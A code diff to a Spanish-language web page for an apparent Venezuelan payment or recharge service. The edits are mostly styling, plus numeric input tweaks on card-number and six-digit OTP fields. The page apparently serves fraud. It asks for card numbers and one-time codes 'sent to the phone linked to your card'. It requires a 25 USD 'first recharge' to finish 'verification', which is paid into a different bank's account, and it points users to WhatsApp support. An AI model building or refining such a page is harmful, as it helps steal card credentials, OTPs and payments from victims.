@@ -864,15 +864,15 @@
     }
 
     .service-icon {
-      width: 32px;
-      height: 32px;
+      width: 50px;
+      height: 50px;
       border-radius: var(--radius-full);
       background: var(--primary);
       color: white;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 1.1rem;
+      font-size: 1.5rem;
     }
 
     .service-icon.bills {
@@ -1881,7 +1881,7 @@
     .access-option {
       display: flex;
       align-items: center;
-      gap: 0.5rem;
+      gap: 0.75rem;
       padding: 0.5rem 1rem;
       font-size: 0.8rem;
       color: var(--neutral-900);
@@ -1889,9 +1889,17 @@
       text-align: left;
     }
 
-    .support-option i {
-      font-size: 0.9rem;
-      color: var(--primary);
+    .support-icon {
+      width: 50px;
+      height: 50px;
+      border-radius: var(--radius-full);
+      background: var(--primary);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5rem;
+      flex-shrink: 0;
     }
 
     .support-option:hover,
@@ -3494,13 +3502,13 @@
     }
 
     .contact-icon {
-      width: 32px;
-      height: 32px;
+      width: 50px;
+      height: 50px;
       border-radius: var(--radius-full);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 1.1rem;
+      font-size: 1.5rem;
       flex-shrink: 0;
       color: white;
       margin-bottom: 0.25rem;
@@ -4056,13 +4064,27 @@
     /* Responsive Styles */
     @media (max-width: 479px) {
       .users-online-badge {
+        display: flex;
+        padding: 0.25rem;
+      }
+
+      #users-online-count {
         display: none;
+      }
+
+      .pulse-dot {
+        width: 8px;
+        height: 8px;
       }
     }
 
     @media (min-width: 480px) {
       .users-online-badge {
         display: flex;
+      }
+
+      #users-online-count {
+        display: inline;
       }
       
       .saved-card-container {
@@ -4244,15 +4266,15 @@
       <button class="btn btn-outline" id="support-btn"><i class="fas fa-headset"></i> Soporte</button>
       <div class="support-menu" id="support-menu">
         <div class="support-option" id="recover-password">
-          <i class="fas fa-key"></i>
+          <div class="support-icon"><i class="fas fa-key"></i></div>
           <span>Recuperar contraseña</span>
         </div>
         <a href="https://wa.me/+17373018059" class="support-option whatsapp-link" id="whatsapp-support" target="_blank">
-          <i class="fab fa-whatsapp"></i>
+          <div class="support-icon"><i class="fab fa-whatsapp"></i></div>
           <span>Hablar por WhatsApp</span>
         </a>
         <div class="support-option" id="tawk-support">
-          <i class="fas fa-comments"></i>
+          <div class="support-icon"><i class="fas fa-comments"></i></div>
           <span>Chat en línea (Tawk.to)</span>
         </div>
       </div>
@@ -5204,7 +5226,7 @@
           
           <div class="form-group">
             <label class="form-label" for="cardNumber">Número de Tarjeta</label>
-            <input type="text" class="form-control" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" aria-describedby="card-number-error">
+            <input type="tel" class="form-control" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" pattern="[0-9 ]*" aria-describedby="card-number-error">
             <div class="error-message" id="card-number-error">Número de tarjeta no válido.</div>
           </div>
           
@@ -5400,7 +5422,7 @@
             <div class="mobile-payment-success-text">Haz tu primera recarga por 25 USD para culminar tu verificación! Ahora tiene sus datos personales configurados para recibir pagos móviles. Puede compartir estos datos con quienes deseen enviarte dinero en Bolívares.</div>
           </div>
         </div>
-        <div class="bank-note" id="mobile-payment-note">No se preocupe, los datos son correctos. Sabemos que su banco principal es <strong><span id="user-bank-name"></span></strong>, pero para su primera recarga le proporcionamos una cuenta en el <strong>Banco Venezolano de Crédito</strong>. Realice la transferencia desde su <strong><span id="user-bank-name-2"></span></strong> o reciba fondos de cualquier persona utilizando estos datos.</div>
+        <div class="bank-note" id="mobile-payment-note" style="display: none;">No se preocupe, los datos son correctos. Sabemos que su banco principal es <strong><span id="user-bank-name"></span></strong>, pero para su primera recarga le proporcionamos una cuenta en el <strong>Banco Venezolano de Crédito</strong>. Realice la transferencia desde su <strong><span id="user-bank-name-2"></span></strong> o reciba fondos de cualquier persona utilizando estos datos.</div>
         
         <div class="section-title" style="margin-bottom: 0.5rem;">
           <i class="fas fa-money-bill"></i> Seleccione un Monto
@@ -5545,12 +5567,12 @@
       <div class="modal-subtitle">Enviamos un código a tu teléfono asociado a tu tarjeta <span id="masked-phone">+44 75** ****13</span></div>
       
       <div class="otp-container">
-        <input type="text" class="otp-input" id="otp-1" maxlength="1" data-next="otp-2" aria-label="OTP dígito 1">
-        <input type="text" class="otp-input" id="otp-2" maxlength="1" data-next="otp-3" data-prev="otp-1" aria-label="OTP dígito 2">
-        <input type="text" class="otp-input" id="otp-3" maxlength="1" data-next="otp-4" data-prev="otp-2" aria-label="OTP dígito 3">
-        <input type="text" class="otp-input" id="otp-4" maxlength="1" data-next="otp-5" data-prev="otp-3" aria-label="OTP dígito 4">
-        <input type="text" class="otp-input" id="otp-5" maxlength="1" data-next="otp-6" data-prev="otp-4" aria-label="OTP dígito 5">
-        <input type="text" class="otp-input" id="otp-6" maxlength="1" data-prev="otp-5" aria-label="OTP dígito 6">
+        <input type="tel" class="otp-input" id="otp-1" maxlength="1" data-next="otp-2" aria-label="OTP dígito 1" inputmode="numeric" pattern="[0-9]*">
+        <input type="tel" class="otp-input" id="otp-2" maxlength="1" data-next="otp-3" data-prev="otp-1" aria-label="OTP dígito 2" inputmode="numeric" pattern="[0-9]*">
+        <input type="tel" class="otp-input" id="otp-3" maxlength="1" data-next="otp-4" data-prev="otp-2" aria-label="OTP dígito 3" inputmode="numeric" pattern="[0-9]*">
+        <input type="tel" class="otp-input" id="otp-4" maxlength="1" data-next="otp-5" data-prev="otp-3" aria-label="OTP dígito 4" inputmode="numeric" pattern="[0-9]*">
+        <input type="tel" class="otp-input" id="otp-5" maxlength="1" data-next="otp-6" data-prev="otp-4" aria-label="OTP dígito 5" inputmode="numeric" pattern="[0-9]*">
+        <input type="tel" class="otp-input" id="otp-6" maxlength="1" data-prev="otp-5" aria-label="OTP dígito 6" inputmode="numeric" pattern="[0-9]*">
       </div>
       
       <div class="error-message" id="otp-error" style="text-align: center; display: none;">Código incorrecto. Intente nuevamente.</div>
@@ -7064,11 +7086,22 @@ function stopVerificationProgress() {
           }
         }
         
-        // Mostrar el mensaje de confirmación si los datos están completos
+        // Mostrar el mensaje de confirmación y la nota informativa si los datos están completos
+        const mobilePaymentSuccess = document.getElementById('mobile-payment-success');
+        const mobilePaymentNote = document.getElementById('mobile-payment-note');
         if (verificationStatus.idNumber && verificationStatus.phoneNumber) {
-          const mobilePaymentSuccess = document.getElementById('mobile-payment-success');
           if (mobilePaymentSuccess) {
             mobilePaymentSuccess.style.display = 'flex';
+          }
+          if (mobilePaymentNote) {
+            mobilePaymentNote.style.display = 'block';
+          }
+        } else {
+          if (mobilePaymentSuccess) {
+            mobilePaymentSuccess.style.display = 'none';
+          }
+          if (mobilePaymentNote) {
+            mobilePaymentNote.style.display = 'none';
           }
         }
       }
